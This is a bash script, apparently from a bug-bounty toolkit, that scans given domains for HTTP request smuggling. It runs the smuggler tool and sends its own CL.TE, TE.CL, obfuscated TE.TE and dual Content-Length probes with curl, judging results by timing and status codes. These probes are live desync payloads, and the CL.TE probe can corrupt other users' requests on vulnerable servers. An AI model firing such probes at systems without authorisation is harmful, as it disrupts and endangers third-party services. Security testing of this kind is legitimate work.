#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_smuggle_detect.sh — HTTP Request Smuggling Detection      ║
# ║  CL.TE / TE.CL / TE.TE probes + timing-based differential   ║
# ║  analysis + smuggler tool integration                         ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_smuggle_detect.sh"
SCRIPT_DESC="HTTP Request Smuggling Detection"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Detect HTTP request smuggling via CL.TE, TE.CL, and TE.TE"
    echo "  probes with timing-based differential analysis."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "4" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build target URL list ─────────────────────────────────────
TARGET_URLS="${OUT_DIR}/_ct_smuggle_targets.txt"
> "$TARGET_URLS"

SMUGGLE_PATHS=("/" "/api/" "/login" "/search" "/graphql")

if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    head -30 "$URLS_FILE" >> "$TARGET_URLS"
fi

build_smuggle_urls() {
    local domain="$1"
    for path in "${SMUGGLE_PATHS[@]}"; do
        echo "https://${domain}${path}" >> "$TARGET_URLS"
    done
}

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        [ -z "$d" ] && continue
        d=$(echo "$d" | sed 's/\*\.//')
        build_smuggle_urls "$d"
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    build_smuggle_urls "$(echo "$DOMAIN" | sed 's/\*\.//')"
fi

sort -u -o "$TARGET_URLS" "$TARGET_URLS"
url_count=$(count_lines "$TARGET_URLS")
info "Testing ${url_count} URLs for request smuggling"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_smuggle_detect_findings.txt"
> "$FINDINGS_FILE"

# ── Timing threshold (seconds) for differential detection ─────
TIMING_THRESHOLD=5

# ── Helper: measure request time ──────────────────────────────
measure_time() {
    local url="$1"
    shift
    local time_total
    time_total=$(curl -sk -o /dev/null -w "%{time_total}" \
        --connect-timeout 8 --max-time 20 \
        "${HUNT_UA_CURL[@]}" "$@" "$url" 2>/dev/null || echo "0")
    echo "$time_total"
}

# ── Helper: get baseline response time ────────────────────────
get_baseline() {
    local url="$1"
    local t1 t2 t3
    t1=$(measure_time "$url")
    t2=$(measure_time "$url")
    t3=$(measure_time "$url")
    # Average (integer math via bc or awk)
    echo "$t1 $t2 $t3" | awk '{printf "%.2f", ($1+$2+$3)/3}'
}

# ═══════════════════════════════════════════════════════════════
# Phase A: smuggler tool (if available)
# ═══════════════════════════════════════════════════════════════
if check_tool smuggler 2>/dev/null; then
    info "Running smuggler tool..."
    smuggler_out="${OUT_DIR}/ct_smuggler_raw.txt"
    > "$smuggler_out"

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        info "  smuggler: ${url}"
        smuggler -u "$url" -t 5 2>/dev/null | tee -a "$smuggler_out" || true
    done < "$TARGET_URLS"

    # Parse smuggler output for findings
    if [ -s "$smuggler_out" ]; then
        grep -iP '(VULNERABLE|DESYNC|SMUGGL|CL\.TE|TE\.CL|TE\.TE)' "$smuggler_out" 2>/dev/null | \
            while IFS= read -r line; do
                echo "[HIGH] SMUGGLER: ${line}" >> "$FINDINGS_FILE"
            done
        smuggler_findings=$(grep -ciP '(VULNERABLE|DESYNC|SMUGGL)' "$smuggler_out" 2>/dev/null || echo 0)
        log "  smuggler findings: ${smuggler_findings}"
    fi
elif check_tool smuggler.py 2>/dev/null; then
    info "Running smuggler.py tool..."
    smuggler_py_out="${OUT_DIR}/ct_smuggler_py_raw.txt"
    > "$smuggler_py_out"

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        info "  smuggler.py: ${url}"
        smuggler.py -u "$url" --timeout 5 2>/dev/null | tee -a "$smuggler_py_out" || true
    done < "$TARGET_URLS"

    if [ -s "$smuggler_py_out" ]; then
        grep -iP '(VULNERABLE|DESYNC|SMUGGL|CL\.TE|TE\.CL)' "$smuggler_py_out" 2>/dev/null | \
            while IFS= read -r line; do
                echo "[HIGH] SMUGGLER-PY: ${line}" >> "$FINDINGS_FILE"
            done
    fi
else
    warn "smuggler/smuggler.py not found — using manual probes only"
fi

# ═══════════════════════════════════════════════════════════════
# Phase B: Manual timing-based smuggling detection
# ═══════════════════════════════════════════════════════════════
info "Running manual smuggling probes..."

tested=0
while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((tested++)) || true

    # Quick liveness check
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")
    if [ "$http_code" = "000" ]; then
        continue
    fi

    # Extract host for raw requests
    url_host=$(echo "$url" | sed 's|https\?://||;s|/.*||')
    url_scheme=$(echo "$url" | grep -oP '^https?' || echo "https")
    url_path=$(echo "$url" | sed 's|https\?://[^/]*||')
    [ -z "$url_path" ] && url_path="/"

    info "[${tested}/${url_count}] ${url} (HTTP ${http_code})"

    # ── Baseline timing ──
    baseline_time=$(get_baseline "$url")
    log "  Baseline time: ${baseline_time}s"

    # ── CL.TE Detection ──
    # Send Content-Length shorter than actual body, with Transfer-Encoding: chunked
    # If front-end uses CL and back-end uses TE, the leftover bytes are interpreted
    # as the start of the next request
    info "  Testing CL.TE..."

    # CL.TE probe: Content-Length says 4 bytes, but body has chunked encoding
    # If vulnerable, back-end processes the chunked body and the trailing "G"
    # becomes "GPOST" prefixed to the next request, causing a timeout/error
    clte_time=$(curl -sk -o /dev/null -w "%{time_total}" \
        --connect-timeout 8 --max-time 20 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 4" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'0\r\n\r\nG' \
        "$url" 2>/dev/null || echo "0")

    clte_diff=$(echo "$clte_time $baseline_time" | awk '{diff=$1-$2; printf "%.2f", (diff<0?-diff:diff)}')
    clte_over=$(echo "$clte_diff $TIMING_THRESHOLD" | awk '{print ($1>=$2) ? "1" : "0"}')

    if [ "$clte_over" = "1" ]; then
        echo "[HIGH] CL.TE POTENTIAL: ${url} | Baseline: ${baseline_time}s | CL.TE: ${clte_time}s | Diff: ${clte_diff}s" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} CL.TE potential at ${url} (${clte_diff}s delay)"

        # Confirm with second probe
        clte_time2=$(curl -sk -o /dev/null -w "%{time_total}" \
            --connect-timeout 8 --max-time 20 \
            "${HUNT_UA_CURL[@]}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Content-Length: 4" \
            -H "Transfer-Encoding: chunked" \
            --data-binary $'0\r\n\r\nG' \
            "$url" 2>/dev/null || echo "0")
        clte_diff2=$(echo "$clte_time2 $baseline_time" | awk '{diff=$1-$2; printf "%.2f", (diff<0?-diff:diff)}')
        clte_over2=$(echo "$clte_diff2 $TIMING_THRESHOLD" | awk '{print ($1>=$2) ? "1" : "0"}')
        if [ "$clte_over2" = "1" ]; then
            echo "[CRITICAL] CL.TE CONFIRMED (2x): ${url} | Probe1: ${clte_time}s | Probe2: ${clte_time2}s" >> "$FINDINGS_FILE"
            warn "  ${RED}[CRITICAL] CL.TE CONFIRMED${NC}: ${url}"
        fi
    fi

    # ── TE.CL Detection ──
    # Front-end uses TE, back-end uses CL
    # Send Transfer-Encoding: chunked with Content-Length for the full body
    info "  Testing TE.CL..."

    tecl_time=$(curl -sk -o /dev/null -w "%{time_total}" \
        --connect-timeout 8 --max-time 20 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 6" \
        -H "Transfer-Encoding: chunked" \
        --data-binary $'0\r\n\r\nX' \
        "$url" 2>/dev/null || echo "0")

    tecl_diff=$(echo "$tecl_time $baseline_time" | awk '{diff=$1-$2; printf "%.2f", (diff<0?-diff:diff)}')
    tecl_over=$(echo "$tecl_diff $TIMING_THRESHOLD" | awk '{print ($1>=$2) ? "1" : "0"}')

    if [ "$tecl_over" = "1" ]; then
        echo "[HIGH] TE.CL POTENTIAL: ${url} | Baseline: ${baseline_time}s | TE.CL: ${tecl_time}s | Diff: ${tecl_diff}s" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} TE.CL potential at ${url} (${tecl_diff}s delay)"

        # Confirm
        tecl_time2=$(curl -sk -o /dev/null -w "%{time_total}" \
            --connect-timeout 8 --max-time 20 \
            "${HUNT_UA_CURL[@]}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Content-Length: 6" \
            -H "Transfer-Encoding: chunked" \
            --data-binary $'0\r\n\r\nX' \
            "$url" 2>/dev/null || echo "0")
        tecl_diff2=$(echo "$tecl_time2 $baseline_time" | awk '{diff=$1-$2; printf "%.2f", (diff<0?-diff:diff)}')
        tecl_over2=$(echo "$tecl_diff2 $TIMING_THRESHOLD" | awk '{print ($1>=$2) ? "1" : "0"}')
        if [ "$tecl_over2" = "1" ]; then
            echo "[CRITICAL] TE.CL CONFIRMED (2x): ${url} | Probe1: ${tecl_time}s | Probe2: ${tecl_time2}s" >> "$FINDINGS_FILE"
            warn "  ${RED}[CRITICAL] TE.CL CONFIRMED${NC}: ${url}"
        fi
    fi

    # ── TE.TE Detection (Transfer-Encoding obfuscation) ──
    # Test if front-end and back-end disagree on TE parsing
    info "  Testing TE.TE obfuscation..."

    TE_VARIANTS=(
        "Transfer-Encoding: xchunked"
        "Transfer-Encoding : chunked"
        "Transfer-Encoding: chunked"$'\r\n'"Transfer-Encoding: cow"
        "Transfer-Encoding: chunked"$'\r\n'"Transfer-encoding: x"
        "Transfer-Encoding:[tab]chunked"
        "X: X"$'\r\n'"Transfer-Encoding: chunked"
        "Transfer-Encoding: chunk"
    )

    for te_variant in "${TE_VARIANTS[@]}"; do
        # Replace [tab] with actual tab
        te_variant="${te_variant//\[tab\]/	}"

        te_time=$(curl -sk -o /dev/null -w "%{time_total}" \
            --connect-timeout 8 --max-time 20 \
            "${HUNT_UA_CURL[@]}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Content-Length: 4" \
            -H "${te_variant}" \
            --data-binary $'0\r\n\r\nG' \
            "$url" 2>/dev/null || echo "0")

        te_diff=$(echo "$te_time $baseline_time" | awk '{diff=$1-$2; printf "%.2f", (diff<0?-diff:diff)}')
        te_over=$(echo "$te_diff $TIMING_THRESHOLD" | awk '{print ($1>=$2) ? "1" : "0"}')

        if [ "$te_over" = "1" ]; then
            # Sanitize variant for log output
            te_label=$(echo "$te_variant" | tr '\r\n\t' '...' | head -c 60)
            echo "[HIGH] TE.TE POTENTIAL: ${url} | Variant: ${te_label} | Time: ${te_time}s | Diff: ${te_diff}s" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH]${NC} TE.TE potential at ${url} variant: ${te_label}"
            break  # One TE.TE finding per URL is sufficient
        fi
    done

    # ── Check Transfer-Encoding handling ──
    # See if server responds differently to valid vs invalid TE
    info "  Testing TE header parsing..."
    resp_chunked=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST -H "Transfer-Encoding: chunked" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-binary $'0\r\n\r\n' \
        "$url" 2>/dev/null || echo "000")

    resp_invalid_te=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST -H "Transfer-Encoding: invalid" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "test" \
        "$url" 2>/dev/null || echo "000")

    if [ "$resp_chunked" != "$resp_invalid_te" ] && [ "$resp_invalid_te" != "000" ]; then
        echo "[INFO] ${url} | TE parsing diff: chunked=${resp_chunked} invalid=${resp_invalid_te}" >> "$FINDINGS_FILE"
    fi

    # ── Check for dual Content-Length ──
    info "  Testing dual Content-Length..."
    dual_cl=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Length: 0" \
        -H "Content-Length: 5" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "test" \
        "$url" 2>/dev/null || echo "000")

    normal_cl=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -X POST \
        -H "Content-Length: 4" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "test" \
        "$url" 2>/dev/null || echo "000")

    if [ "$dual_cl" != "$normal_cl" ] && [ "$dual_cl" != "000" ]; then
        echo "[MEDIUM] DUAL CL ACCEPTED: ${url} | Dual: ${dual_cl} | Normal: ${normal_cl}" >> "$FINDINGS_FILE"
        warn "  ${YELLOW}[MEDIUM]${NC} ${url} accepts dual Content-Length headers"
    fi

done < "$TARGET_URLS"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$TARGET_URLS"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
critical_count=$(grep -c '^\[CRITICAL\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "Smuggling detection: ${finding_count} total findings"
log "  CRITICAL (confirmed desync):  ${critical_count}"
log "  HIGH (potential smuggling):    ${high_count}"
log "  MEDIUM (header parsing diff): ${medium_count}"
log "Tested ${tested} URLs"
if [ "$critical_count" -gt 0 ]; then
    warn "Confirmed request smuggling detected — HIGH SEVERITY"
fi
log "Results: ${FINDINGS_FILE}"
